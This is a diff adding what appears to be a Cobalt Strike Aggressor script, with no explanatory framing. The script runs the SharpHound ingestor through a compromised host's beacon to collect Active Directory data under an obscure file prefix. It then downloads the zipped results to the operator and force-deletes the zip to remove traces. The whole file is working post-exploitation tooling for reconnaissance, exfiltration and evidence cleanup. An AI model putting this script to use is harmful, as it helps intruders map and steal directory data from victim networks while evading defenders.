@@ -1,0 +1,33 @@
+
+##########ToDo: ##############
+# Check if we have write permissions to pwd
+#
+##############################
+
+
+#Waits for BloodHound to finish and downloads the zip
+on beacon_output {
+    if ("Compressing data to " isin $2){
+        bnote($1,"Downloading BloodHound Files: " . formatDate('MM/dd HH:mm:ss (z)'));
+        bshell($1,"rename 3hCw9rkdclldRji* 3hCw9rkdclldRji.zip");
+        bdownload($1, "3hCw9rkdclldRji.zip");
+    }
+}
+
+
+#Waits for download of zip file and removes it
+on beacon_output_alt {
+    if ("3hCw9rkdclldRji.zip is complete" isin $2){
+        bshell($1,"del /f 3hCw9rkdclldRji.zip");
+        bnote($1,"Finished BloodHound: " . formatDate('MM/dd HH:mm:ss (z)'));
+
+    }
+}
+
+
+# Imports and start BloodHound
+alias startBloodhound{
+    bnote($1,"Started BloodHound: " . formatDate('MM/dd HH:mm:ss (z)'));
+    bpowershell_import($1, "/root/tools/Bloodhound/Ingestors/SharpHound.ps1");
+    bpowershell($1, 'Invoke-Bloodhound -CompressData -RemoveCSV -NoSaveCache -CSVPrefix "3hCw9rkdclldRji"');
+}
